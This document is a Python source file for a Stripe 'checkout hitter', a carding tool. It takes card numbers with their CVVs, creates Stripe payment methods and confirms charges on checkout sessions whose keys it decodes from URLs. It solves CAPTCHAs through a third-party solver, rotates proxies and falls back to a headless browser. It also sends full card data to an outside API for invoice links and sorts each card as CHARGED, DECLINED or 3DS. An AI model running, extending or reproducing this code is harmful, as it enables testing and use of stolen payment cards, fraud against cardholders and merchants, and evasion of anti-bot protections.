"""
Checkout Hitter - Clean Version with CAPTCHA Bypass
Based on provided script with simple aiohttp approach
Supports browser fallback for restricted Stripe checkouts
"""
import time
import re
import base64
import asyncio
import json
import os
import sys
import aiohttp
import sqlite3
from urllib.parse import unquote, quote
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from nopecha_solver import solve_turnstile, solve_recaptcha_v2

# Browser fallback (lazy import to avoid loading Playwright until needed)
_browser_checker = None

def get_browser_checker():
    global _browser_checker
    if _browser_checker is None:
        try:
            import browser_co_checker
            _browser_checker = browser_co_checker
            print("[CO] Browser checker loaded for fallback support")
        except ImportError as e:
            print(f"[CO] Browser checker not available: {e}")
            _browser_checker = False
    return _browser_checker if _browser_checker else None

# Database helper for BIN lookup in co_checker
def get_bin_offline(bin_code):
    try:
        conn = sqlite3.connect('database.db')
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM bins WHERE bin=?", (bin_code[:6],))
        row = cursor.fetchone()
        conn.close()
        if row:
            return dict(row)
    except:
        pass
    return None

_bin_cache = {}

async def _lookup_bin_online(bin_code):
    """Lookup BIN info using online APIs, returns formatted string like 'VISA | GREEN DOT BANK | 🇺🇸'"""
    bin_code = str(bin_code)[:6]
    if bin_code in _bin_cache:
        return _bin_cache[bin_code]
    
    offline = get_bin_offline(bin_code)
    if offline and offline.get('bank') and offline.get('bank') != 'Unknown':
        brand = (offline.get('brand') or 'Unknown').upper()
        bank = (offline.get('bank') or 'Unknown').upper()
        flag = offline.get('country_flag') or ''
        result = f"{brand} | {bank} | {flag}"
        _bin_cache[bin_code] = result
        return result
    
    try:
        s = await get_session()
        try:
            async with s.get(f"https://bins.antipublic.cc/bins/{bin_code}", timeout=aiohttp.ClientTimeout(total=4)) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    brand = (data.get('brand') or 'Unknown').upper()
                    bank = (data.get('bank') or 'Unknown').upper()
                    flag = data.get('country_flag') or ''
                    if not flag:
                        cc = data.get('country_code') or data.get('country') or ''
                        if len(cc) == 2:
                            flag = ''.join(chr(0x1F1E6 + ord(c) - ord('A')) for c in cc.upper())
                    result = f"{brand} | {bank} | {flag}"
                    _bin_cache[bin_code] = result
                    return result
        except:
            pass
        
        try:
            async with s.get(f"https://lookup.binlist.net/{bin_code}", timeout=aiohttp.ClientTimeout(total=4)) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    brand = (data.get('scheme') or 'Unknown').upper()
                    bank_data = data.get('bank') or {}
                    bank = (bank_data.get('name') or 'Unknown').upper()
                    country_data = data.get('country') or {}
                    flag = country_data.get('emoji') or ''
                    result = f"{brand} | {bank} | {flag}"
                    _bin_cache[bin_code] = result
                    return result
        except:
            pass
    except:
        pass
    
    return "UNKNOWN | UNKNOWN | "

HEADERS = {
    "accept": "application/json",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://checkout.stripe.com",
    "referer": "https://checkout.stripe.com/",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
}


# Default Stripe Turnstile sitekey
STRIPE_TURNSTILE_SITEKEY = "0x4AAAAAAAVIsCO_xv9In984"

_session = None

def parse_proxy_format(proxy_str: str) -> dict:
    proxy_str = proxy_str.strip()
    result = {"user": None, "password": None, "host": None, "port": None, "raw": proxy_str}
    
    try:
        if '@' in proxy_str:
            if proxy_str.count('@') == 1:
                auth_part, host_part = proxy_str.rsplit('@', 1)
                if ':' in auth_part:
                    result["user"], result["password"] = auth_part.split(':', 1)
                if ':' in host_part:
                    result["host"], port_str = host_part.rsplit(':', 1)
                    result["port"] = int(port_str)
        else:
            parts = proxy_str.split(':')
            if len(parts) == 4:
                result["host"] = parts[0]
                result["port"] = int(parts[1])
                result["user"] = parts[2]
                result["password"] = parts[3]
            elif len(parts) == 2:
                result["host"] = parts[0]
                result["port"] = int(parts[1])
    except:
        pass
    
    return result

def get_proxy_url(proxy_str: str) -> str | None:
    if not proxy_str:
        return None
    parsed = parse_proxy_format(proxy_str)
    if parsed["host"] and parsed["port"]:
        if parsed["user"] and parsed["password"]:
            user_encoded = quote(parsed["user"], safe='')
            pass_encoded = quote(parsed["password"], safe='')
            return f"http://{user_encoded}:{pass_encoded}@{parsed['host']}:{parsed['port']}"
        else:
            return f"http://{parsed['host']}:{parsed['port']}"
    return None

def decode_pk_from_url(url: str) -> dict:
    result = {"pk": None, "cs": None, "site": None}
    
    try:
        cs_match = re.search(r'cs_(live|test)_[A-Za-z0-9]+', url)
        if cs_match:
            result["cs"] = cs_match.group(0)
        
        if '#' not in url:
            return result
        
        hash_part = url.split('#')[1]
        hash_decoded = unquote(hash_part)
        
        try:
            decoded_bytes = base64.b64decode(hash_decoded)
            xored = ''.join(chr(b ^ 5) for b in decoded_bytes)
            
            pk_match = re.search(r'pk_(live|test)_[A-Za-z0-9]+', xored)
            if pk_match:
                result["pk"] = pk_match.group(0)
            
            site_match = re.search(r'https?://[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', xored)
            if site_match:
                full_site = site_match.group(0)
                # Filter out Stripe's own domains from the XOR string
                if "stripe.com" not in full_site.lower() and "checkout.stripe.com" not in full_site.lower():
                    result["site"] = full_site
            
            # Additional fallback: check for common patterns in xored string
            if not result.get("site") or "stripe.com" in result.get("site", "").lower():
                domains = re.findall(r'[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', xored)
                for d in domains:
                    d_lower = d.lower()
                    if not any(x in d_lower for x in ["stripe.com", "checkout.stripe.com", "api.stripe.com", "js.stripe.com", "m.stripe.network"]):
                        result["site"] = d
                        break
            
            # NEW FALLBACK: Check metadata for redirect_url or success_url which often contains the site
            if not result.get("site") or "stripe.com" in result.get("site", "").lower():
                # Look for URLs in the raw xored string that aren't stripe
                all_urls = re.findall(r'https?://[^\s\"\'\<\>#]+', xored)
                for u in all_urls:
                    u_lower = u.lower()
                    if not any(x in u_lower for x in ["stripe.com", "checkout.stripe.com", "api.stripe.com", "js.stripe.com", "m.stripe.network", "apple.com", "google.com"]):
                        from urllib.parse import urlparse
                        domain = urlparse(u).netloc
                        if domain:
                            result["site"] = domain
                            break
        except:
            pass
            
    except:
        pass
    
    return result

def get_currency_symbol(currency: str) -> str:
    symbols = {
        "USD": "$", "EUR": "€", "GBP": "£", "INR": "₹", "JPY": "¥",
        "CNY": "¥", "KRW": "₩", "RUB": "₽", "BRL": "R$", "CAD": "C$",
        "AUD": "A$", "MXN": "MX$", "SGD": "S$", "HKD": "HK$", "THB": "฿",
        "VND": "₫", "PHP": "₱", "IDR": "Rp", "MYR": "RM", "ZAR": "R",
        "CHF": "CHF", "SEK": "kr", "NOK": "kr", "DKK": "kr", "PLN": "zł",
        "TRY": "₺", "AED": "د.إ", "SAR": "﷼", "ILS": "₪", "TWD": "NT$"
    }
    return symbols.get(currency, "")

async def get_session():
    global _session
    if _session is None or _session.closed:
        _session = aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(limit=100, ttl_dns_cache=300, ssl=False, keepalive_timeout=60),
            timeout=aiohttp.ClientTimeout(total=60, connect=20, sock_read=40)
        )
    return _session

async def get_checkout_info(url: str, proxy_str: str | None = None) -> dict:
    """Get checkout info using aiohttp with retries"""
    start = time.perf_counter()
    result = {
        "url": url, "pk": None, "cs": None, "merchant": None, "site": None, "price": None,
        "currency": None, "product": None, "country": None, "mode": None,
        "init_data": None, "error": None, "time": 0
    }
    
    # Strip and check if URL is empty or just whitespace
    url = url.strip() if url else ""
    print(f"[CO] DEBUG: Processing URL: '{url}' (len: {len(url)})")
    
    if not url or len(url) < 10:
        print("[CO] ERROR: URL too short or empty")
        result["error"] = "No checkout URL provided"
        result["time"] = round(time.perf_counter() - start, 2)
        return result
            
    try:
        decoded = decode_pk_from_url(url)
        result["pk"] = decoded.get("pk")
        result["cs"] = decoded.get("cs")
        result["site"] = decoded.get("site")
        
        if result["pk"] and result["cs"]:
            proxy_url = get_proxy_url(proxy_str) if proxy_str else None
            s = await get_session()
            body = f"key={result['pk']}&eid=NA&browser_locale=en-US&redirect_type=url"
            
            for attempt in range(3):
                try:
                    async with s.post(
                        f"https://api.stripe.com/v1/payment_pages/{result['cs']}/init",
                        headers=HEADERS,
                        data=body,
                        proxy=proxy_url,
                        timeout=aiohttp.ClientTimeout(total=30)
                    ) as r:
                        if r.status != 200:
                            if attempt < 2:
                                await asyncio.sleep(1)
                                continue
                            result["error"] = f"HTTP {r.status}"
                            break
                            
                        init_data = await r.json()
                        
                    if "error" not in init_data:
                        result["init_data"] = init_data
                        acc = init_data.get("account_settings", {})
                        result["merchant"] = acc.get("display_name") or acc.get("business_name")
                        result["country"] = acc.get("country")
                        
                        # ALIGNMENT: Use success_url or cancel_url to find the site if XOR failed
                        if not result.get("site") or "stripe.com" in result.get("site", "").lower():
                            for url_key in ["success_url", "cancel_url"]:
                                target_url = init_data.get(url_key)
                                if target_url and "stripe.com" not in target_url.lower():
                                    from urllib.parse import urlparse
                                    result["site"] = urlparse(target_url).netloc
                                    break
                        
                        # Extract success_url from init_data for confirmation
                        result["success_url"] = init_data.get("success_url")
                        print(f"[CO] INIT success_url: {init_data.get('success_url')}")
                        
                        lig = init_data.get("line_item_group")
                        inv = init_data.get("invoice")
                        if lig:
                            result["price"] = lig.get("total", 0) / 100
                            result["currency"] = lig.get("currency", "").upper()
                            if lig.get("line_items"):
                                result["product"] = lig["line_items"][0].get("name")
                        elif inv:
                            result["price"] = inv.get("total", 0) / 100
                            result["currency"] = inv.get("currency", "").upper()
                        
                        mode = init_data.get("mode", "")
                        result["mode"] = mode.upper() if mode else ("SUBSCRIPTION" if init_data.get("subscription") else "PAYMENT")
                        break
                    else:
                        err = init_data.get("error", {})
                        msg = err.get("message", "Init failed")
                        result["error"] = "EXPIRED" if "expired" in msg.lower() or "no longer active" in msg.lower() else msg
                        break
                except asyncio.TimeoutError:
                    if attempt == 2:
                        result["error"] = "Connection Timeout (No response from Stripe)"
                    await asyncio.sleep(1)
                except Exception as e:
                    if attempt == 2:
                        result["error"] = f"Network Error ({str(e)[:30]})"
                    await asyncio.sleep(1)
        else:
            result["error"] = "Could not decode PK/CS from URL"
            
    except Exception as e:
        result["error"] = str(e)
    
    result["time"] = round(time.perf_counter() - start, 2)
    # Ensure success_url is passed back
    return result

async def check_single_card(checkout_url: str, card: dict, proxy_str: str | None = None, use_browser_fallback: bool = False) -> dict:
    """Helper for web panel API to check a single card with global timeout protection
    
    Args:
        checkout_url: Stripe checkout URL
        card: Card dict with cc, month, year, cvv
        proxy_str: Optional proxy string
        use_browser_fallback: If True, use browser for restricted sites (slower but works on all)
    """
    start_time = time.perf_counter()
    
    async def _do_check():
        # Handle invoice URLs
        if "invoice.stripe.com/i/" in checkout_url:
            payload = {
                "key": "BRY-KESNP-TUPWH-JFOT9",
                "card": f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}",
                "invoice_url": checkout_url
            }
            try:
                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=60)) as s:
                    async with s.post("https://api.barryxapi.xyz/stripe_invoice", json=payload, headers={"Content-Type": "application/json"}) as res:
                        data = await res.json()
                        api_result = data.get("result", {}) if isinstance(data.get("result"), dict) else data
                        raw_status = api_result.get("status", data.get("status", data.get("response", "DECLINED")))
                        status = str(raw_status).upper()
                        
                        message = "Unknown Response"
                        message_sources = [api_result, data]
                        message_keys = ["message", "error", "msg", "reason", "details", "decline_code"]
                        for src in message_sources:
                            for key in message_keys:
                                val = src.get(key)
                                if val and isinstance(val, str):
                                    message = val
                                    break
                            if message != "Unknown Response": break
                        
                        elapsed = round(time.perf_counter() - start_time, 2)
                        return {
                            "status": status,
                            "response": message,
                            "merchant": "Stripe Invoice",
                            "product": "Invoice Payment",
                            "amount": api_result.get("amount") or "Unknown",
                            "time": elapsed
                        }
            except Exception as e:
                return {
                    "status": "ERROR",
                    "response": f"API Error: {str(e)[:50]}",
                    "merchant": "Stripe Invoice",
                    "product": "Invoice Payment",
                    "amount": "0.00",
                    "time": round(time.perf_counter() - start_time, 2)
                }

        if not checkout_url or len(checkout_url.strip()) < 10:
            return {
                "status": "ERROR",
                "response": "No checkout URL provided",
                "merchant": "ERROR: No checkout URL provided",
                "product": "Unknown",
                "amount": "0.00",
                "time": 0
            }
        
        checkout_info = await get_checkout_info(checkout_url, proxy_str)
        if checkout_info.get("error"):
            # Set the merchant to ERROR if the URL is missing, otherwise use what we have
            merchant_name = "ERROR: No checkout URL provided" if not checkout_url else (checkout_info.get("merchant") or "Unknown")
            return {
                "status": "ERROR",
                "response": checkout_info["error"],
                "merchant": merchant_name,
                "product": "Unknown",
                "amount": "0.00",
                "time": checkout_info.get("time", 0)
            }
        
        result = await charge_card(card, checkout_info, proxy_str)
        
        final_result = {
            "status": result.get("status", "UNKNOWN"),
            "response": result.get("response", "No response from gateway"),
            "merchant": checkout_info.get("merchant", "Unknown"),
            "product": checkout_info.get("product", "Unknown"),
            "amount": f"{checkout_info.get('price', '0.00')} {checkout_info.get('currency', '')}",
            "receipt_url": result.get("receipt_url"),
            "success_url": result.get("success_url") or checkout_info.get("success_url"),
            "time": result.get("time", 0),
            "bin_info": result.get("bin_info")
        }
        
        # Browser fallback for restricted checkouts
        if final_result["status"] == "NOT SUPPORTED" and use_browser_fallback:
            browser_checker = get_browser_checker()
            if browser_checker:
                print(f"[CO] API blocked, trying browser fallback...")
                browser_result = await browser_checker.browser_charge_card(checkout_url, card, proxy_str)
                final_result["status"] = browser_result.get("status", "ERROR")
                final_result["response"] = browser_result.get("response", "Browser check failed")
                
                # Align secondary response with detailed decline reason if available
                decline_reason = browser_result.get("decline_reason")
                if decline_reason:
                    final_result["secondary_response"] = f"[{decline_reason}] {final_result['response']}"
                else:
                    final_result["secondary_response"] = browser_result.get("response")
                
                final_result["time"] = browser_result.get("time", 0)
                final_result["method"] = "browser"
            else:
                final_result["response"] = "Checkout requires browser (enable browser fallback)"
        
        print(f"[CO] Final: {final_result['status']} - {final_result['response']} ({final_result['time']}s)")
        return final_result
    
    try:
        # Increase timeout when browser fallback is enabled
        result = await asyncio.wait_for(_do_check(), timeout=120.0 if use_browser_fallback else 75.0)
        if not result.get("response"):
            result["response"] = "No response from gateway"
        return result
    except asyncio.TimeoutError:
        elapsed = round(time.perf_counter() - start_time, 2)
        return {
            "status": "ERROR",
            "response": f"Gateway timeout after {elapsed}s - proxy may be slow or blocked",
            "merchant": "Unknown",
            "product": "Unknown",
            "amount": "0.00",
            "time": elapsed
        }
    except asyncio.CancelledError:
        elapsed = round(time.perf_counter() - start_time, 2)
        return {
            "status": "ERROR",
            "response": "Request cancelled",
            "merchant": "Unknown",
            "product": "Unknown",
            "amount": "0.00",
            "time": elapsed
        }
    except Exception as e:
        elapsed = round(time.perf_counter() - start_time, 2)
        err_msg = str(e)[:100] if str(e) else "Unknown error"
        return {
            "status": "ERROR",
            "response": err_msg,
            "merchant": "Error",
            "product": "Error",
            "amount": "0.00",
            "time": elapsed
        }

def detect_captcha_challenge(conf: dict) -> tuple[bool, str, str]:
    """
    Detect if the response indicates a CAPTCHA challenge.
    Returns: (is_captcha, sitekey, captcha_type)
    """
    # Check error object for captcha
    if "error" in conf:
        err = conf["error"]
        err_type = err.get("type", "")
        err_code = err.get("code", "")
        err_msg = err.get("message", "").lower()
        
        # Direct captcha error type or code
        if err_type == "captcha" or err_code == "captcha_required" or "captcha" in err_code:
            captcha_data = err.get("captcha", {})
            sitekey = captcha_data.get("sitekey", STRIPE_TURNSTILE_SITEKEY)
            captcha_type = captcha_data.get("type", "turnstile")
            print(f"[CO] CAPTCHA detected in error: type={captcha_type}, sitekey={sitekey[:20]}...")
            return True, sitekey, captcha_type
        
        # Captcha in error message
        if "captcha" in err_msg or "verify you are human" in err_msg or "bot detection" in err_msg:
            captcha_data = err.get("captcha", {})
            sitekey = captcha_data.get("sitekey", STRIPE_TURNSTILE_SITEKEY)
            captcha_type = captcha_data.get("type", "turnstile")
            print(f"[CO] CAPTCHA detected in message: type={captcha_type}")
            return True, sitekey, captcha_type
    
    # Check top-level captcha fields
    if conf.get("captcha") or conf.get("requires_captcha"):
        captcha_data = conf.get("captcha", {})
        sitekey = captcha_data.get("sitekey", STRIPE_TURNSTILE_SITEKEY)
        captcha_type = captcha_data.get("type", "turnstile")
        print(f"[CO] CAPTCHA detected in response: type={captcha_type}")
        return True, sitekey, captcha_type
    
    # Check for intent_confirmation_challenge (Stripe's bot detection)
    if conf.get("intent_confirmation_challenge"):
        challenge = conf.get("intent_confirmation_challenge", {})
        challenge_type = challenge.get("type", "")
        if challenge_type in ["turnstile", "recaptcha", "captcha"]:
            sitekey = challenge.get("sitekey", STRIPE_TURNSTILE_SITEKEY)
            print(f"[CO] CAPTCHA detected in intent_confirmation_challenge: type={challenge_type}")
            return True, sitekey, challenge_type
    
    # Check for direct sitekey in response (common in newer Stripe versions)
    if "sitekey" in str(conf).lower():
        # Try to extract sitekey from raw response if nested
        import re
        match = re.search(r'0x4[A-Z0-9_-]{18,22}', str(conf))
        if match:
            sitekey = match.group(0)
            print(f"[CO] CAPTCHA sitekey extracted from response string: {sitekey}")
            return True, sitekey, "turnstile"
    
    # Check nested payment_intent for captcha challenge
    pi = conf.get("payment_intent", {})
    if isinstance(pi, dict):
        next_action = pi.get("next_action", {})
        if next_action.get("type") == "verify_with_microdeposits":
            pass  # Not a captcha
        elif "captcha" in str(next_action).lower():
            print(f"[CO] CAPTCHA detected in payment_intent.next_action")
            return True, STRIPE_TURNSTILE_SITEKEY, "turnstile"
    
    return False, "", ""

async def charge_card(card: dict, checkout_data: dict, proxy_str: str | None = None, bypass_3ds: bool = False, max_retries: int = 2) -> dict:
    """
    Simplified charge_card matching v2 reference implementation.
    Clean approach: PM creation -> Confirm -> Handle response
    
    Key features:
    - Simple headers and body format
    - Clean error handling without complex fallbacks  
    - CAPTCHA bypass with NoPeCHA
    - BIN lookup included
    - Raw response storage for transparency
    """
    start = time.perf_counter()
    card_display = f"{card['cc'][:6]}****{card['cc'][-4:]}"
    bin_info_str = await _lookup_bin_online(card['cc'][:6])
    result = {
        "card": f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}",
        "status": None,
        "response": None,
        "bin_info": bin_info_str,
        "time": 0
    }
    
    pk = checkout_data.get("pk")
    cs = checkout_data.get("cs")
    init_data = checkout_data.get("init_data")
    checkout_url = checkout_data.get("url", "https://checkout.stripe.com")
    
    if not pk or not cs or not init_data:
        result["status"] = "FAILED"
        result["response"] = "No checkout data"
        result["time"] = round(time.perf_counter() - start, 2)
        return result
    
    print(f"\n[CO] Card: {card_display}")
    
    for attempt in range(max_retries + 1):
        try:
            proxy_url = get_proxy_url(proxy_str) if proxy_str else None
            connector = aiohttp.TCPConnector(limit=100, ssl=False)
            async with aiohttp.ClientSession(connector=connector) as s:
                email = init_data.get("customer_email") or "john@example.com"
                checksum = init_data.get("init_checksum", "")
                
                lig = init_data.get("line_item_group")
                inv = init_data.get("invoice")
                if lig:
                    total, subtotal = lig.get("total", 0), lig.get("subtotal", 0)
                elif inv:
                    total, subtotal = inv.get("total", 0), inv.get("subtotal", 0)
                else:
                    pi = init_data.get("payment_intent") or {}
                    total = subtotal = pi.get("amount", 0)
                
                cust = init_data.get("customer") or {}
                addr = cust.get("address") or {}
                name = cust.get("name") or "John Smith"
                country = addr.get("country") or "US"
                line1 = addr.get("line1") or "476 West White Mountain Blvd"
                city = addr.get("city") or "Pinetop"
                state = addr.get("state") or "AZ"
                zip_code = addr.get("postal_code") or "85929"
                
                # Step 1: Create Payment Method
                pm_body = f"type=card&card[number]={card['cc']}&card[cvc]={card['cvv']}&card[exp_month]={card['month']}&card[exp_year]={card['year']}&billing_details[name]={name}&billing_details[email]={email}&billing_details[address][country]={country}&billing_details[address][line1]={line1}&billing_details[address][city]={city}&billing_details[address][postal_code]={zip_code}&billing_details[address][state]={state}&key={pk}"
                
                if attempt > 0:
                    print(f"[CO] Retry attempt {attempt}...")
                print(f"[CO] Creating payment method...")
                
                async with s.post("https://api.stripe.com/v1/payment_methods", headers=HEADERS, data=pm_body, proxy=proxy_url) as r:
                    pm = await r.json()
                
                if "error" in pm:
                    err_msg = pm["error"].get("message", "Card error")
                    print(f"[CO] PM Error: {err_msg[:60]}")
                    
                    # If unsupported integration, return NOT SUPPORTED cleanly
                    if "unsupported" in err_msg.lower() or "tokenization" in err_msg.lower() or "integration surface" in err_msg.lower() or "elements" in err_msg.lower():
                        result["status"] = "NOT SUPPORTED"
                        result["response"] = "Checkout not supported (requires Stripe Elements)"
                        result["raw_response"] = json.dumps(pm)
                    else:
                        result["status"] = "DECLINED"
                        result["response"] = err_msg
                        result["raw_response"] = json.dumps(pm)
                    
                    # IMPORTANT: If NOT SUPPORTED and we have browser fallback enabled in check_single_card, 
                    # we should return this status so the parent function can catch it.
                    result["time"] = round(time.perf_counter() - start, 2)
                    return result
                
                pm_id = pm.get("id")
                if not pm_id:
                    result["status"] = "FAILED"
                    result["response"] = "No payment method ID"
                    result["time"] = round(time.perf_counter() - start, 2)
                    return result
                
                print(f"[CO] PM Created: {pm_id}")
                
                # Step 2: Confirm Payment
                print(f"[CO] Confirming payment...")
                conf_body = f"eid=NA&payment_method={pm_id}&expected_amount={total}&last_displayed_line_item_group_details[subtotal]={subtotal}&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key={pk}&init_checksum={checksum}"
                
                if bypass_3ds:
                    conf_body += "&return_url=https://checkout.stripe.com"
                
                async with s.post(f"https://api.stripe.com/v1/payment_pages/{cs}/confirm", headers=HEADERS, data=conf_body, proxy=proxy_url) as r:
                    conf = await r.json()
                
                print(f"[CO] Confirm Response: {str(conf)[:200]}...")
                
                # Step 3: Handle CAPTCHA if required
                is_captcha, sitekey, captcha_type = detect_captcha_challenge(conf)
                if is_captcha:
                    max_captcha_retries = 2
                    captcha_solved = False
                    
                    for c_attempt in range(max_captcha_retries + 1):
                        print(f"[CO] CAPTCHA detected (Attempt {c_attempt+1}), type: {captcha_type}, solving...")
                        result["status"] = "CAPTCHA"
                        result["response"] = f"Solving {captcha_type.capitalize()} CAPTCHA (Try {c_attempt+1})..."
                        
                        token = None
                        if captcha_type == "turnstile":
                            token = await solve_turnstile(sitekey, checkout_url)
                        elif captcha_type in ["recaptcha2", "recaptcha"]:
                            token = await solve_recaptcha_v2(sitekey, checkout_url)
                        
                        if token:
                            print(f"[CO] CAPTCHA solved, retrying confirmation...")
                            result["captcha_bypassed"] = True
                            retry_conf_body = conf_body + f"&captcha_token={token}"
                            async with s.post(f"https://api.stripe.com/v1/payment_pages/{cs}/confirm", headers=HEADERS, data=retry_conf_body, proxy=proxy_url) as r:
                                conf = await r.json()
                            
                            is_captcha, sitekey, captcha_type = detect_captcha_challenge(conf)
                            if not is_captcha:
                                captcha_solved = True
                                break
                        else:
                            print(f"[CO] CAPTCHA solve failed on attempt {c_attempt+1}")
                    
                    if not captcha_solved and is_captcha:
                        result["status"] = "CAPTCHA"
                        result["response"] = "CAPTCHA Bypass Failed"
                        result["time"] = round(time.perf_counter() - start, 2)
                        return result
                
                # Step 4: Parse Response
                if "error" in conf:
                    err = conf["error"]
                    dc = err.get("decline_code", "")
                    msg = err.get("message", "Failed")
                    result["status"] = "DECLINED"
                    result["response"] = msg
                    
                    # Enhanced logic for secondary response (Detail section)
                    # If the decline is generic but the message is specific (like expiration),
                    # we should prioritize the technical error code if it adds value.
                    
                    technical_reason = ""
                    if dc:
                        technical_reason = dc.upper()
                    else:
                        technical_reason = (err.get("code") or err.get("type", "")).upper()
                    
                    # AVOID REDUNDANCY: If the message already explains the error clearly,
                    # and the technical reason is just "GENERIC_DECLINE", don't show it.
                    if technical_reason == "GENERIC_DECLINE" and any(word in msg.lower() for word in ["expire", "cvc", "fraud", "fund", "security"]):
                        result["secondary_response"] = ""
                    elif technical_reason == "REQUIRES_SOURCE_ACTION":
                        result["response"] = "3D Secure Required"
                        result["secondary_response"] = "[3DS]"
                        result["status"] = "3DS"
                    elif technical_reason:
                        result["secondary_response"] = f"[{technical_reason}]"
                    else:
                        result["secondary_response"] = ""
                            
                    result["raw_response"] = json.dumps(conf)
                    print(f"[CO] Decline: {dc} - {msg}")
                else:
                    pi = conf.get("payment_intent") or {}
                    st = pi.get("status", "") if isinstance(pi, dict) else conf.get("status", "")
                    
                    if st in ["succeeded", "requires_capture"] or conf.get("payment_status") == "paid":
                        result["status"] = "CHARGED"
                        result["response"] = "Payment Successful"
                        success_url = init_data.get("success_url", "")
                        if success_url:
                            success_url = success_url.replace("{CHECKOUT_SESSION_ID}", cs).replace("&amp;", "&")
                        
                        # PRIORITY: 1. Stripe Receipt URL, 2. Formatted Success URL
                        stripe_receipt = pi.get("receipt_url") or conf.get("receipt_url")
                        result["receipt_url"] = stripe_receipt or success_url
                        result["raw_response"] = json.dumps(conf)
                    elif st == "requires_action":
                        # Handle 3DS - all requires_action is 3DS for user
                        if bypass_3ds:
                            result["status"] = "3DS SKIP"
                            result["response"] = "3DS Cannot be bypassed"
                        else:
                            result["status"] = "3DS"
                            result["response"] = "3D Secure Required"
                        result["raw_response"] = json.dumps(conf)
                    elif st == "requires_payment_method":
                        result["status"] = "DECLINED"
                        result["response"] = "Card Declined"
                        result["raw_response"] = json.dumps(conf)
                    else:
                        result["status"] = "UNKNOWN"
                        result["response"] = st or "Unknown"
                        result["raw_response"] = json.dumps(conf)
                
                result["time"] = round(time.perf_counter() - start, 2)
                print(f"[CO] Final: {result['status']} - {result['response']} ({result['time']}s)")
                return result
                    
        except Exception as e:
            err_str = str(e)
            print(f"[CO] Error: {err_str[:50]}")
            if attempt < max_retries and ("disconnect" in err_str.lower() or "timeout" in err_str.lower() or "connection" in err_str.lower()):
                print(f"[CO] Retrying in 1s...")
                await asyncio.sleep(1)
                continue
            result["status"] = "ERROR"
            result["response"] = err_str[:50]
            result["time"] = round(time.perf_counter() - start, 2)
            print(f"[CO] Final: {result['status']} - {result['response']} ({result['time']}s)")
            return result
    
    return result
